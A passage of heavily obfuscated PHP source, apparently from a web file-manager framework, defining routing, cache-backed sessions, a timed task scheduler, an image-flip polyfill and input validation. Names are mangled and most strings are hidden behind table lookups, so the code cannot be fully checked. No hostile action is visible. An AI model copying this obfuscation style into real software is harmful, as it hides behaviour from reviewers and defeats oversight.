$C¸œ¨Ê„ƒ¿[9]) { $D®È°·ƒÏ¥ = substr($aŒ‹ˆÄçÂ[0], 0, -5); return Model($D®È°·ƒÏ¥); } else { $eøÑ²Ãè• = $aŒ‹ˆÄçÂ[0] . $aŒ‹ˆÄçÂ[1]; $f«ğãÆëµ = CONTROLLER_DIR . $aŒ‹ˆÄçÂ[0] . $C¸œ¨Ê„ƒ¿[4] . $aŒ‹ˆÄçÂ[1] . $C¸œ¨Ê„ƒ¿[14]; } } $Aœã‰ÉÔ = strtolower($eøÑ²Ãè•); goto AÜÓÏãÎâ; Dñ­‚¶Óí: $C¸œ¨Ê„ƒ¿ =& $_SERVER[ãˆÙà–ÃÙ]; static $C½ÙĞêôÁñ = array(); $cÇ§‹®ĞĞ = $D®È°·ƒÏ¥; goto Fèòêß“ÉŞ; fÉîè¦ö‘: $C½ÙĞêôÁñ[$Aœã‰ÉÔ] = new $eøÑ²Ãè•(); $C½ÙĞêôÁñ[$cÇ§‹®ĞĞ] = $C½ÙĞêôÁñ[$Aœã‰ÉÔ]; return $C½ÙĞêôÁñ[$Aœã‰ÉÔ]; goto fŠÀ—›ƒ³×; AÜÓÏãÎâ: if (isset($C½ÙĞêôÁñ[$Aœã‰ÉÔ])) { return $C½ÙĞêôÁñ[$Aœã‰ÉÔ]; } if (is_file($f«ğãÆëµ)) { include_once $f«ğãÆëµ; } if (!class_exists($eøÑ²Ãè•)) { return actionCallError("\133{$D®È°·ƒÏ¥}\x20\75\x3e\x20{$eøÑ²Ãè•}\x5d\x20\x63\154\x61\163\x73\40\x6e\157\164\x20\x65\170\151\x73\x74\163\41"); } goto fÉîè¦ö‘; Fèòêß“ÉŞ: if (isset($C½ÙĞêôÁñ[$cÇ§‹®ĞĞ])) { return $C½ÙĞêôÁñ[$cÇ§‹®ĞĞ]; } $D®È°·ƒÏ¥ = trim(str_replace($C¸œ¨Ê„ƒ¿[4], $C¸œ¨Ê„ƒ¿[5], $D®È°·ƒÏ¥), $C¸œ¨Ê„ƒ¿[4]); $aŒ‹ˆÄçÂ = explode($C¸œ¨Ê„ƒ¿[5], $D®È°·ƒÏ¥); goto D•«‰œÒÂ; fŠÀ—›ƒ³×: } function ActionApply($E„³‘ùÒ‰¥, $d…Ù°À·í = array()) { goto a¯ÊÄ’Ğ·ö; a¯ÊÄ’Ğ·ö: if (is_array($E„³‘ùÒ‰¥)) { return call_user_func_array($E„³‘ùÒ‰¥, $d…Ù°À·í); } if (function_exists($E„³‘ùÒ‰¥)) { return call_user_func_array($E„³‘ùÒ‰¥, $d…Ù°À·í); } $EÀÍùš¯ÏŠ = strrpos($E„³‘ùÒ‰¥, $_SERVER[ãˆÙà–ÃÙ][5]); goto f³´®÷À†; CªÂæ¿¯·: if (!method_exists($aÈ‰Ÿªá¿, $eàã³ÑùÆ¹)) { return actionCallError("{$E„³‘ùÒ‰¥}\x20\155\145\x74\150\x6f\x64\x20\156\x6f\x74\x20\x65\x78\x69\x73\x74\163\x21"); } $E¾ÉĞ²¼ˆç = call_user_func_array(array($aÈ‰Ÿªá¿, $eàã³ÑùÆ¹), $d…Ù°À·í); return $E¾ÉĞ²¼ˆç; goto EŞ·ŒÂÌ¥³; f³´®÷À†: $f˜Úàö‘³è = substr($E„³‘ùÒ‰¥, 0, $EÀÍùš¯ÏŠ); $eàã³ÑùÆ¹ = substr($E„³‘ùÒ‰¥, $EÀÍùš¯ÏŠ + 1); $aÈ‰Ÿªá¿ = Action($f˜Úàö‘³è); goto CªÂæ¿¯·; EŞ·ŒÂÌ¥³: } function actionCallError($fßå¯©‰Î¥) { return write_log($fßå¯©‰Î¥, $_SERVER[ãˆÙà–ÃÙ][15]); } goto Fôš´™Œƒ; d‘­–»˜ğî: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\x5b\x5e\x2f\135\53", "\72\156\165\155" => "\133\x30\55\x39\x5d\x2b", "\x3a\141\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($dÚ… å·“, $cöÁˆÜ©“¢) { $fÍµ‹Ş‰Ğ =& $_SERVER[Å¸ş]; if ($dÚ… å·“ == $fÍµ‹Ş‰Ğ[1385]) { $f§“²Ò×· = array_map($fÍµ‹Ş‰Ğ[1386], $cöÁˆÜ©“¢[0]); $Fâœ˜Å˜¤¦ = strpos($cöÁˆÜ©“¢[1], $fÍµ‹Ş‰Ğ[8]) === 0 ? $cöÁˆÜ©“¢[1] : $fÍµ‹Ş‰Ğ[8] . $cöÁˆÜ©“¢[1]; $D«°‘ùµÊ = $cöÁˆÜ©“¢[2]; } else { $f§“²Ò×· = null; $Fâœ˜Å˜¤¦ = strpos($cöÁˆÜ©“¢[0], $fÍµ‹Ş‰Ğ[8]) === 0 ? $cöÁˆÜ©“¢[0] : $fÍµ‹Ş‰Ğ[8] . $cöÁˆÜ©“¢[0]; $D«°‘ùµÊ = $cöÁˆÜ©“¢[1]; } array_push(self::$maps, $f§“²Ò×·); array_push(self::$routes, $Fâœ˜Å˜¤¦); array_push(self::$methods, strtoupper($dÚ… å·“)); array_push(self::$callbacks, $D«°‘ùµÊ); } public static function error($E´ÑŒ½†¸) { self::$errorCallback = $E´ÑŒ½†¸; } public static function haltOnMatch($c·æŠï¡Å = true) { self::$halts = $c·æŠï¡Å; } public static function dispatch() { goto A¸¡Ğ¨±Ú; B‡Š…‰ãùŒ: self::$routes = preg_replace($Eá Œˆ½š»[1071], $Eá Œˆ½š»[8], self::$routes); if (in_array($EÏàÉ‰öõ›, self::$routes)) { $cåÁÑê®ê = array_keys(self::$routes, $EÏàÉ‰öõ›); foreach ($cåÁÑê®ê as $d·–™‹•Æà) { if (self::$methods[$d·–™‹•Æà] == $bÙ‰–ë¾ || self::$methods[$d·–™‹•Æà] == $Eá Œˆ½š»[1388] || in_array($bÙ‰–ë¾, self::$maps[$d·–™‹•Æà])) { $C×äé·‰¬Š = !0; if (!is_object(self::$callbacks[$d·–™‹•Æà])) { $C±›ô¢ï„Æ = explode($Eá Œˆ½š»[8], self::$callbacks[$d·–™‹•Æà]); $a„³µµ°ÁÔ = end($C±›ô¢ï„Æ); $E´¡¹¥«± = explode($Eá Œˆ½š»[1389], $a„³µµ°ÁÔ); $c¯‰ê‘¯Ê = new $E´¡¹¥«±[0](); $c¯‰ê‘¯Ê->{$E´¡¹¥«±[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$d·–™‹•Æà]); if (self::$halts) { return; } } } } } else { $C‚•£ âëŒ = 0; foreach (self::$routes as $d·–™‹•Æà) { if (strpos($d·–™‹•Æà, $Eá Œˆ½š»[4]) !== !1) { $d·–™‹•Æà = str_replace($FÉã¥¶‚’, $B×‰Ì·‘Ï, $d·–™‹•Æà); } if (preg_match($Eá Œˆ½š»[1390] . $d·–™‹•Æà . $Eá Œˆ½š»[1391], $EÏàÉ‰öõ›, $e°¼·‰ê)) { if (self::$methods[$C‚•£ âëŒ] == $bÙ‰–ë¾ || self::$methods[$C‚•£ âëŒ] == $Eá Œˆ½š»[1388] || !empty(self::$maps[$C‚•£ âëŒ]) && in_array($bÙ‰–ë¾, self::$maps[$C‚•£ âëŒ])) { $C×äé·‰¬Š = !0; array_shift($e°¼·‰ê); if (!is_object(self::$callbacks[$C‚•£ âëŒ])) { $C±›ô¢ï„Æ = explode($Eá Œˆ½š»[8], self::$callbacks[$C‚•£ âëŒ]); $a„³µµ°ÁÔ = end($C±›ô¢ï„Æ); $E´¡¹¥«± = explode($Eá Œˆ½š»[1389], $a„³µµ°ÁÔ); $c¯‰ê‘¯Ê = new $E´¡¹¥«±[0](); if (!method_exists($c¯‰ê‘¯Ê, $E´¡¹¥«±[1])) { echo $Eá Œˆ½š»[1392]; } else { call_user_func_array(array($c¯‰ê‘¯Ê, $E´¡¹¥«±[1]), $e°¼·‰ê); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$C‚•£ âëŒ], $e°¼·‰ê); if (self::$halts) { return; } } } } $C‚•£ âëŒ++; } } if ($C×äé·‰¬Š == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $d¿‡«³äâ­ =& $_SERVER[Å¸ş]; header($_SERVER[$d¿‡«³äâ­[1393]] . $d¿‡«³äâ­[1394]); echo $d¿‡«³äâ­[1395]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Eá Œˆ½š»[1387]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto E¨¡¹»‹˜—; A¸¡Ğ¨±Ú: $Eá Œˆ½š» =& $_SERVER[Å¸ş]; $EÏàÉ‰öõ› = parse_url($_SERVER[$Eá Œˆ½š»[1387]], PHP_URL_PATH); $bÙ‰–ë¾ = $_SERVER[$Eá Œˆ½š»[154]]; goto fì‡ŞñÅ¨; fì‡ŞñÅ¨: $FÉã¥¶‚’ = array_keys(static::$patterns); $B×‰Ì·‘Ï = array_values(static::$patterns); $C×äé·‰¬Š = !1; goto B‡Š…‰ãùŒ; E¨¡¹»‹˜—: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto D¥Ø¢ŞšÏö; B§ã¼öÖ­Ö: if (self::$sessionSign) { } else { if (Cookie::get($B•ñÍõˆ¿²)) { self::$sessionSign = Cookie::get($B•ñÍõˆ¿²); } else { self::$sessionSign = guid(); } } Cookie::setSafe($B•ñÍõˆ¿², self::$sessionSign, self::$sessionTime); $d¼‚äÌ™¶½ = $CÄ˜ƒñ‘Óø[$E­”ÆŒÕ‡Œ[1398]]; goto bëÒÌ§´Çƒ; AˆŒ¨Î¸´‹: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $aÑğÑ¯˜¨› = new self(); return $aÑğÑ¯˜¨›; goto b¬´‘âßÛØ; eŠ‘»‡–: $CÄ˜ƒñ‘Óø = $GLOBALS[$E­”ÆŒÕ‡Œ[6]][$E­”ÆŒÕ‡Œ[337]]; self::$sessionTime = $CÄ˜ƒñ‘Óø[$E­”ÆŒÕ‡Œ[1396]]; $B•ñÍõˆ¿² = isset($GLOBALS[$E­”ÆŒÕ‡Œ[1397]]) ? $GLOBALS[$E­”ÆŒÕ‡Œ[1397]] : SESSION_ID; goto B§ã¼öÖ­Ö; D¥Ø¢ŞšÏö: $E­”ÆŒÕ‡Œ =& $_SERVER[Å¸ş]; static $aÑğÑ¯˜¨› = false; if ($aÑğÑ¯˜¨›) { return $aÑğÑ¯˜¨›; } goto eŠ‘»‡–; bëÒÌ§´Çƒ: $Dá¦”±Î«ù = $CÄ˜ƒñ‘Óø[$d¼‚äÌ™¶½]; $FšÒŠ˜†› = $CÄ˜ƒñ‘Óø[$E­”ÆŒÕ‡Œ[758]]; switch ($d¼‚äÌ™¶½) { case $E­”ÆŒÕ‡Œ[17]: self::$handle = Model($E­”ÆŒÕ‡Œ[759]); break; case $E­”ÆŒÕ‡Œ[760]: self::$handle = new CacheRedis($Dá¦”±Î«ù, $FšÒŠ˜†›); break; case $E­”ÆŒÕ‡Œ[761]: self::$handle = new CacheMemcached($Dá¦”±Î«ù, $FšÒŠ˜†›); break; case $E­”ÆŒÕ‡Œ[167]: $Dá¦”±Î«ù[$E­”ÆŒÕ‡Œ[75]] = $Dá¦”±Î«ù[$E­”ÆŒÕ‡Œ[75]] . $E­”ÆŒÕ‡Œ[1399]; self::$handle = new CacheFile($Dá¦”±Î«ù, $FšÒŠ˜†›); default: break; } goto AˆŒ¨Î¸´‹; b¬´‘âßÛØ: } public static function sign($C¥ŞÎâªµâ = false) { $C¥ŞÎâªµâ && (self::$sessionSign = $C¥ŞÎâªµâ); self::init(); return self::$sessionSign; } public static function set($f‰Œ§ÚÚÍÔ, $Cì„›‡´ƒ° = false) { self::init(); if (is_array($f‰Œ§ÚÚÍÔ)) { foreach ($f‰Œ§ÚÚÍÔ as $D½Ì©‹ÌŠ¢ => $cî‹ĞĞîø) { array_set_value(self::$data, $D½Ì©‹ÌŠ¢, $cî‹ĞĞîø); } } else { array_set_value(self::$data, $f‰Œ§ÚÚÍÔ, $Cì„›‡´ƒ°); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($F·”®¥‚Üš = false) { self::init(); if (!$F·”®¥‚Üš) { return self::$data; } return array_get_value(self::$data, $F·”®¥‚Üš); } public static function remove($fãóØÓò) { self::init(); unset(self::$data[$fãóØÓò]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Å¸ş][763])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto fä‚õ’¢Ã; Aï„‹Û½© : http_close(); self::valueSet($AÊš²Œ»é’[1400], $AÊš²Œ»é’[83]); Hook::bind($AÊš²Œ»é’[1402], $AÊš²Œ»é’[1403]); goto B” ‘Ô¥ß¨; B” ‘Ô¥ß¨: while (!0) { self::cacheClear(); if (self::valueGet($AÊš²Œ»é’[692]) != $AÊš²Œ»é’[83]) { self::valueSet($AÊš²Œ»é’[1400], $AÊš²Œ»é’[470]); self::log($AÊš²Œ»é’[1404]); die; } self::valueSet($AÊš²Œ»é’[1400], $AÊš²Œ»é’[83]); self::valueSet($AÊš²Œ»é’[1401], time()); self::taskRunAll(); sleep(self::valueGet($AÊš²Œ»é’[1405])); } goto bš»˜¨‘ê; fä‚õ’¢Ã: $AÊš²Œ»é’ =& $_SERVER[Å¸ş]; if (self::valueGet($AÊš²Œ»é’[692]) != $AÊš²Œ»é’[83]) { return; } if (self::valueGet($AÊš²Œ»é’[1400]) == $AÊš²Œ»é’[83]) { $bµŞ¢àÌîñ = self::valueGet($AÊš²Œ»é’[1401]); if (time() - $bµŞ¢àÌîñ > 3600 * 2) { self::restart(); } return; } goto Aï„‹Û½© ; bš»˜¨‘ê: } public static function restart() { $C¹Ÿì©È­Î =& $_SERVER[Å¸ş]; http_close(); self::valueSet($C¹Ÿì©È­Î[692], $C¹Ÿì©È­Î[470]); sleep(self::valueGet($C¹Ÿì©È­Î[1405]) + 5); self::valueSet($C¹Ÿì©È­Î[1400], $C¹Ÿì©È­Î[470]); self::valueSet($C¹Ÿì©È­Î[692], $C¹Ÿì©È­Î[83]); } public static function shutdownEvent() { $DéËæ’º¸ =& $_SERVER[Å¸ş]; self::valueSet($DéËæ’º¸[1400], $DéËæ’º¸[470]); self::log($DéËæ’º¸[1406]); } public static function config($C“‰Ê™”ç½, $C®œ˜¯›¼ˆ) { $Bèº‰­¡Õè =& $_SERVER[Å¸ş]; $Bî¡êÀ’éË = 20; $C®œ˜¯›¼ˆ = intval($C®œ˜¯›¼ˆ) <= $Bî¡êÀ’éË ? $Bî¡êÀ’éË : intval($C®œ˜¯›¼ˆ); self::valueSet($Bèº‰­¡Õè[692], $C“‰Ê™”ç½); self::valueSet($Bèº‰­¡Õè[1405], $C®œ˜¯›¼ˆ); } private static function taskRunAll() { $C¶óÍñË =& $_SERVER[Å¸ş]; $C…ÜÀ±½°… = Model($C¶óÍñË[1407])->listData(); $c‡ÔÈİ«ß = count($C…ÜÀ±½°…); for ($F¾¤¥ì£Œ® = 0; $F¾¤¥ì£Œ® < $c‡ÔÈİ«ß; $F¾¤¥ì£Œ®++) { $c¿æŸæäç³ = $C…ÜÀ±½°…[$F¾¤¥ì£Œ®]; if ($c¿æŸæäç³[$C¶óÍñË[1408]] != $C¶óÍñË[83]) { continue; } if (!self::taskTimeCheck($c¿æŸæäç³)) { continue; } self::taskRun($c¿æŸæäç³); } Hook::trigger($C¶óÍñË[1409]); } private static function taskTimeCheck($b ¥ä¿º¦ø) { goto eÆŸ—†ÉÜ; eÆŸ—†ÉÜ: $b ¼Œ¹™àŒ =& $_SERVER[Å¸ş]; $FÌ‹ª÷…”Ô = json_decode($b ¥ä¿º¦ø[$b ¼Œ¹™àŒ[190]], !0); $eˆö“‘œÏÇ = intval($b ¥ä¿º¦ø[$b ¼Œ¹™àŒ[1401]]); goto BÚã¸³ƒÏÄ; AìƒĞàæô: switch ($FÌ‹ª÷…”Ô[$b ¼Œ¹™àŒ[29]]) { case $b ¼Œ¹™àŒ[1416]: if (time() - $eˆö“‘œÏÇ < 3600 * 24 * 30) { return !1; } if ($FÌ‹ª÷…”Ô[$b ¼Œ¹™àŒ[1416]] == date($b ¼Œ¹™àŒ[1417]) && $båùğÓ“÷²) { return !0; } break; case $b ¼Œ¹™àŒ[1418]: if (time() - $eˆö“‘œÏÇ < 3600 * 24 * 7) { return !1; } $a´‡‡ËÍÖ¼ = date($b ¼Œ¹™àŒ[1419]) == 0 ? 7 : date($b ¼Œ¹™àŒ[1419]); if ($FÌ‹ª÷…”Ô[$b ¼Œ¹™àŒ[1418]] == $a´‡‡ËÍÖ¼ && $båùğÓ“÷²) { return !0; } break; case $b ¼Œ¹™àŒ[1411]: if (time() - $eˆö“‘œÏÇ < 3600 * 24) { return !1; } if ($båùğÓ“÷²) { return !0; } break; case $b ¼Œ¹™àŒ[1420]: if (time() - $eˆö“‘œÏÇ >= floatval($FÌ‹ª÷…”Ô[$b ¼Œ¹™àŒ[1420]]) * 60) { return !0; } break; default: break; } return !1; goto b£ƒÉÖí¤ˆ; BÚã¸³ƒÏÄ: $Bí±ğ—™•» = strtotime($b ¼Œ¹™àŒ[1410] . $FÌ‹ª÷…”Ô[$b ¼Œ¹™àŒ[1411]] . $b ¼Œ¹™àŒ[1412]) - strtotime($b ¼Œ¹™àŒ[1413]); $C·Š¥²ç’ç = time() - strtotime(date($b ¼Œ¹™àŒ[1414]) . $b ¼Œ¹™àŒ[1415]); $båùğÓ“÷² = $C·Š¥²ç’ç >= $Bí±ğ—™•» && $C·Š¥²ç’ç <= $Bí±ğ—™•» + 3600; goto AìƒĞàæô; b£ƒÉÖí¤ˆ: } public static function taskRun($aÏìØ×ŸÛ‡) { goto C¢›¼°¿é; F÷âï¸ŞÙ·: $eäù÷†‡¼æ = timeFloat(); $Eß…¸ùè“¡ = $AçĞªØì‘®[33]; switch ($aÏìØ×ŸÛ‡[$AçĞªØì‘®[29]]) { case $AçĞªØì‘®[295]: $D¸ñô¶‚ò… = url_request($aÏìØ×ŸÛ‡[$AçĞªØì‘®[1424]], $AçĞªØì‘®[216], !1, !1, !1, !1, 5); $Eß…¸ùè“¡ = strlen($D¸ñô¶‚ò…); break; case $AçĞªØì‘®[215]: $Eß…¸ùè“¡ = Hook::apply($aÏìØ×ŸÛ‡[$AçĞªØì‘®[1424]]); default: break; } goto d¡´š‚‡®õ; C¢›¼°¿é: $AçĞªØì‘® =& $_SERVER[Å¸ş]; self::log($AçĞªØì‘®[1421] . $aÏìØ×ŸÛ‡[$AçĞªØì‘®[367]] . $AçĞªØì‘®[1422] . $aÏìØ×ŸÛ‡[$AçĞªØì‘®[28]] . $AçĞªØì‘®[1423] . $aÏìØ×ŸÛ‡[$AçĞªØì‘®[1424]]); Model($AçĞªØì‘®[1407])->run($aÏìØ×ŸÛ‡[$AçĞªØì‘®[367]]); goto F÷âï¸ŞÙ·; d¡´š‚‡®õ: Model($AçĞªØì‘®[1425])->add(array($AçĞªØì‘®[1426] => $AçĞªØì‘®[33], $AçĞªØì‘®[1427] => $AçĞªØì‘®[470], $AçĞªØì‘®[29] => $AçĞªØì‘®[1428] . $aÏìØ×ŸÛ‡[$AçĞªØì‘®[367]], $AçĞªØì‘®[1429] => json_encode(array($AçĞªØì‘®[28] => $aÏìØ×ŸÛ‡[$AçĞªØì‘®[28]], $AçĞªØì‘®[1430] => timeFloat() - $eäù÷†‡¼æ, $AçĞªØì‘®[281] => $Eß…¸ùè“¡)))); self::log($AçĞªØì‘®[1431] . $aÏìØ×ŸÛ‡[$AçĞªØì‘®[367]] . $AçĞªØì‘®[1432] . $Eß…¸ùè“¡); return !0; goto AïÅÕÂƒ‘¸; AïÅÕÂƒ‘¸: } private static function valueGet($FŠâ†æÆÇõ) { $F»‚ì×Õïí =& $_SERVER[Å¸ş]; $b©…”õ…åˆ = $F»‚ì×Õïí[1433]; $a¬«ğŒ¥¡ = Model($F»‚ì×Õïí[1434])->get($FŠâ†æÆÇõ, $b©…”õ…åˆ); if (is_null($a¬«ğŒ¥¡)) { Model($F»‚ì×Õïí[1434])->set($F»‚ì×Õïí[1405], 10, $b©…”õ…åˆ); Model($F»‚ì×Õïí[1434])->set($F»‚ì×Õïí[692], $F»‚ì×Õïí[83], $b©…”õ…åˆ); Model($F»‚ì×Õïí[1434])->set($F»‚ì×Õïí[1400], $F»‚ì×Õïí[470], $b©…”õ…åˆ); $a¬«ğŒ¥¡ = Model($F»‚ì×Õïí[1434])->get($FŠâ†æÆÇõ, $b©…”õ…åˆ); } return $a¬«ğŒ¥¡; } private static function valueSet($A„ğÀ“®¦¢, $cèèËŞÆÖ) { $EÕ„‡‡Ÿ‘æ =& $_SERVER[Å¸ş]; return Model($EÕ„‡‡Ÿ‘æ[1434])->set($A„ğÀ“®¦¢, $cèèËŞÆÖ, $EÕ„‡‡Ÿ‘æ[1433]); } protected static function log($Eš·çµ¨) { write_log($Eš·çµ¨, $_SERVER[Å¸ş][1435]); } private static function cacheClear() { $B›Œõ¼¶í =& $_SERVER[Å¸ş]; $DÖòƒæ·É = Model($B›Œõ¼¶í[1434])->cacheKey($B›Œõ¼¶í[1433]); Cache::clearMemory($DÖòƒæ·É); Model($B›Œõ¼¶í[1407])->cacheClear(); } } goto bí¯Ö®É°È; EÇğà–‹§Ô: if (!function_exists($_SERVER[Å¸ş][1875])) { define($_SERVER[Å¸ş][1876], 0); define($_SERVER[Å¸ş][1877], 1); define($_SERVER[Å¸ş][1878], 2); function imageflip($D­‚²¢”é°, $E¯—êù˜) { switch ($E¯—êù˜) { case IMG_FLIP_HORIZONTAL: $BğåÙ»ö = imagesx($D­‚²¢”é°) - 1; $DÎçæº‚‡’ = $BğåÙ»ö / 2; $DŒ°©Ï¦ì¹ = imagesy($D­‚²¢”é°); $DùÎ‚¡Ÿ™ = imageistruecolor($D­‚²¢”é°) ? imagecreatetruecolor(1, $DŒ°©Ï¦ì¹) : imagecreate(1, $DŒ°©Ï¦ì¹); for ($Aùƒ†Ğ³ƒ = 0; $Aùƒ†Ğ³ƒ < $DÎçæº‚‡’; ++$Aùƒ†Ğ³ƒ) { imagecopy($DùÎ‚¡Ÿ™, $D­‚²¢”é°, 0, 0, $Aùƒ†Ğ³ƒ, 0, 1, $DŒ°©Ï¦ì¹); imagecopy($D­‚²¢”é°, $D­‚²¢”é°, $Aùƒ†Ğ³ƒ, 0, $BğåÙ»ö - $Aùƒ†Ğ³ƒ, 0, 1, $DŒ°©Ï¦ì¹); imagecopy($D­‚²¢”é°, $DùÎ‚¡Ÿ™, $BğåÙ»ö - $Aùƒ†Ğ³ƒ, 0, 0, 0, 1, $DŒ°©Ï¦ì¹); } break; case IMG_FLIP_VERTICAL: $C«ÎÖŒÉˆö = imagesx($D­‚²¢”é°); $b‘ŠæÓ‰ó = imagesy($D­‚²¢”é°) - 1; $f¡ºÏßæ•„ = $b‘ŠæÓ‰ó / 2; $DùÎ‚¡Ÿ™ = imageistruecolor($D­‚²¢”é°) ? imagecreatetruecolor($C«ÎÖŒÉˆö, 1) : imagecreate($C«ÎÖŒÉˆö, 1); for ($A¶ĞÇ‚ŠğÒ = 0; $A¶ĞÇ‚ŠğÒ < $f¡ºÏßæ•„; ++$A¶ĞÇ‚ŠğÒ) { imagecopy($DùÎ‚¡Ÿ™, $D­‚²¢”é°, 0, 0, 0, $A¶ĞÇ‚ŠğÒ, $C«ÎÖŒÉˆö, 1); imagecopy($D­‚²¢”é°, $D­‚²¢”é°, 0, $A¶ĞÇ‚ŠğÒ, 0, $b‘ŠæÓ‰ó - $A¶ĞÇ‚ŠğÒ, $C«ÎÖŒÉˆö, 1); imagecopy($D­‚²¢”é°, $DùÎ‚¡Ÿ™, 0, $b‘ŠæÓ‰ó - $A¶ĞÇ‚ŠğÒ, 0, 0, $C«ÎÖŒÉˆö, 1); } break; case IMG_FLIP_BOTH: $C«ÎÖŒÉˆö = imagesx($D­‚²¢”é°); $DŒ°©Ï¦ì¹ = imagesy($D­‚²¢”é°); $DùÎ‚¡Ÿ™ = imagerotate($D­‚²¢”é°, 180, 0); imagecopy($D­‚²¢”é°, $DùÎ‚¡Ÿ™, 0, 0, 0, 0, $C«ÎÖŒÉˆö, $DŒ°©Ï¦ì¹); break; default: return; } imagedestroy($DùÎ‚¡Ÿ™); } } if (!function_exists($_SERVER[Å¸ş][1879])) { function imagecreatefrombmp($a–œ›¥¢Ìƒ) { return ImageGdBMP::load($a–œ›¥¢Ìƒ); } } class Input { public static function getArray($EŒéöÂƒ©²) { goto C¼Ü†Ï”ó®; a‚ä»°ïŸ«: $FîÁÊ…» = array(); $fõ•œ¾…Ì§ = LNG($CŠ¦áÆ¼…½[1880]); foreach ($EŒéöÂƒ©² as $d¸îµ·Ÿø® => $càŠ­Õå½–) { goto fïÅó±…É„; d»µÆùßêº: if (isset($càŠ­Õå½–[$CŠ¦áÆ¼…½[1883]]) && !self::check($in[$d¸îµ·Ÿø®], $càŠ­Õå½–[$CŠ¦áÆ¼…½[1883]], $D©â¹ßÖË´)) { if (array_key_exists($CŠ¦áÆ¼…½[1882], $càŠ­Õå½–)) { if (!is_null($càŠ­Õå½–[$CŠ¦áÆ¼…½[1882]])) { $bÓ§—Åëôå[$aóö·ÛøÃ] = $càŠ­Õå½–[$CŠ¦áÆ¼…½[1882]]; } } else { $FîÁÊ…»[] = $aòæ²Ïøò; } continue; } $bÓ§—Åëôå[$aóö·ÛøÃ] = $in[$d¸îµ·Ÿø®]; goto B›©‹ç°£Ö; d¨­ŸÁéÛ¡: if (!array_key_exists($d¸îµ·Ÿø®, $in)) { if (array_key_exists($CŠ¦áÆ¼…½[1882], $càŠ­Õå½–)) { if (!is_null($càŠ­Õå½–[$CŠ¦áÆ¼…½[1882]])) { $bÓ§—Åëôå[$aóö·ÛøÃ] = $càŠ­Õå½–[$CŠ¦áÆ¼…½[1882]]; } } else { if (isset($càŠ­Õå½–[$CŠ¦áÆ¼…½[1883]])) { $FîÁÊ…»[] = $aòæ²Ïøò; } } continue; } if (isset($càŠ­Õå½–[$CŠ¦áÆ¼…½[1883]]) && $càŠ­Õå½–[$CŠ¦áÆ¼…½[1883]] == $CŠ¦áÆ¼…½[282]) { $fÊÙ†‘Û¨ä = json_decode($in[$d¸îµ·Ÿø®], !0); if (is_array($fÊÙ†‘Û¨ä)) { $bÓ§—Åëôå[$aóö·ÛøÃ] = $fÊÙ†‘Û¨ä; } else { if (array_key_exists($CŠ¦áÆ¼…½[1882], $càŠ­Õå½–)) { if (!is_null($càŠ­Õå½–[$CŠ¦áÆ¼…½[1882]])) { $bÓ§—Åëôå[$aóö·ÛøÃ] = $càŠ­Õå½–[$CŠ¦áÆ¼…½[1882]]; } } else { $FîÁÊ…»[] = $aòæ²Ïøò; } } continue; } $D©â¹ßÖË´ = _get($càŠ­Õå½–, $CŠ¦áÆ¼…½[1010]); goto d»µÆùßêº; fïÅó±…É„: $aòæ²Ïøò = _get($càŠ­Õå½–, $CŠ¦áÆ¼…½[1244], $fõ•œ¾…Ì§ . $CŠ¦áÆ¼…½[877] . $d¸îµ·Ÿø®); $aóö·ÛøÃ = $d¸îµ·Ÿø®; if (isset($càŠ­Õå½–[$CŠ¦áÆ¼…½[1881]]) && $càŠ­Õå½–[$CŠ¦áÆ¼…½[1881]]) { $aóö·ÛøÃ = $càŠ­Õå½–[$CŠ¦áÆ¼…½[1881]]; } goto d¨­ŸÁéÛ¡; B›©‹ç°£Ö: } goto Dš“Õğ©Ì; C¼Ü†Ï”ó®: $CŠ¦áÆ¼…½ =& $_SERVER[Å¸ş]; global $in; $bÓ§—Åëôå = array(); goto a‚ä»°ïŸ«; Dš“Õğ©Ì: if (count($FîÁÊ…») > 0) { show_json(implode($CŠ¦áÆ¼…½[1884], $FîÁÊ…»), !1); } return $bÓ§—Åëôå; goto b™ù¾˜÷º; b™ù¾˜÷º: } public static function reg($dõ®ŠÜ·ææ = "\x72\x65\161\165\151\162\145") { static $CÙ·¶ŒÓ— = array("\162\x65\161\x75\x69\x72\x65" => "\56\x2b", "\156\165\x6d\x62\145\162" => "\x5c\144\x2b", "\151\156\164\x65\147\145\162" => "\134\x64\x2b", "\x68\145\170" => "\133\x30\55\71\x41\55\x46\141\55\146\135\53", "\x69\156\164" => "\x5b\55\134\53\135\x3f\x5c\x64\x2b", "\142\x6f\x6f\x6c" => "\60\x7c\61", "\146\154\x6f\141\x74" => "\x5b\55\134\53\x5d\77\x5c\x64\x2b\50\x5c\x2e\134\144\53\51\77", "\x65\x6e\x67\154\151\x73\150" => "\133\101\55\x5a\141\55\x7a\40\x5d\53", "\x63\x68\x69\x6e\145\x73\145" => "\133\134\x78\x7b\x34\145\x30\x30\x7d\x2d\134\x78\x7b\x39\146\x61\65\x7d\x5d\x2b", "\150\141\163\x43\150\x69\156\145\x73\x65" => "\57\50\133\x5c\x78\173\64\x65\60\x30\175\x2d\x5c\x78\x7b\x39\146\141\65\175\135\x2b\x29\57\165", "\145\x6d\141\151\154" => "\134\167\x2b\x28\133\134\x2e\x5c\55\x5d\x5c\167\x2b\x29\x2a\134\x40\134\x77\x2b\x28\x5b\x5c\x2e\134\55\135\134\167\53\51\x2a\x5c\56\134\x77\x2b", 